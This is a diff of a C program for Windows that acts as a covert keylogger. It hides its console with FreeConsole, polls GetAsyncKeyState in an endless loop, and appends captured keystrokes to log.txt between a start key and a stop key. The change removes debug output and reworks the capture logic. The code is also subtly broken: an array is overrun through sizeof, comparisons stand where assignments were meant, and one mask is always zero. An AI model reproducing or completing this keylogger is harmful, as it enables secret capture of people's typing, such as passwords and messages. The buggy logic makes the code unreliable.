@@ -14,22 +14,11 @@ int Save(int _key, char *file);
 int SaveInt(int number, char *file);
 
 int main(void){
-    printf("%s\n", "Start of log");
-    int back = 47;
-    printf("%d", '/');
-    printf("%s", &back);
-
     FreeConsole();
-
-    char i;
-    printf("%s\n", "INIT");
     while (1 == 1){
         Sleep(10);
-        for (i = 8; i < 255; i++){
-            //printf("%d", i);
-            // SaveInt(GetAsyncKeyState(i),"log.txt");
-            if ((GetAsyncKeyState(i) == -32767) && (i == 47)){
-                printf("%s activated with %d", "Chat", i);
+        for (char i = 8; i < 255; i++){
+            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x41)){
                 Save(i, "log.txt");
             }
         }
@@ -37,26 +26,34 @@ int main(void){
     return 0;
 }
 
-
-
 int Save(int _key, char *file){
-    printf("%d\n", _key);
     Sleep(10);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen(file, "a+");
-
+    fprintf(OUTPUT_FILE, "START\n");
+    
     int activeKey = 1;
+    int pressedChars[254];
+
+    for(int iteration = 0; iteration < sizeof(pressedChars); iteration++){
+        pressedChars[iteration] = 0;
+    }
 
     while (activeKey == 1){
         Sleep(10);
         for (char i = 8; i < 255; i++){
-            if (i == VK_TAB){
+            if ((GetAsyncKeyState(i) & 0x8000) && (i == 0x42)){
                 activeKey = 0;
+                fprintf(OUTPUT_FILE, "END");
                 fclose(OUTPUT_FILE);
                 break;
             }
-            if ((GetAsyncKeyState(i) == -32767)){
-                fprintf(OUTPUT_FILE, "%s", &_key);
+            if ((GetAsyncKeyState(i) & 0x8000 & (pressedChars[i-8] == 0))){
+                pressedChars[i-8] == 1;
+            }
+            if (((GetAsyncKeyState(i) & 0x0000) & (pressedChars[i-8] == 1))){
+                pressedChars[i-8] == 0;
+                fprintf(OUTPUT_FILE, "%s,%d\n", &i,i);
             }
         }
     }
@@ -71,3 +68,4 @@ int SaveInt(int number, char *file){
     fclose(OUTPUT_FILE);
     return 0;
 }
+
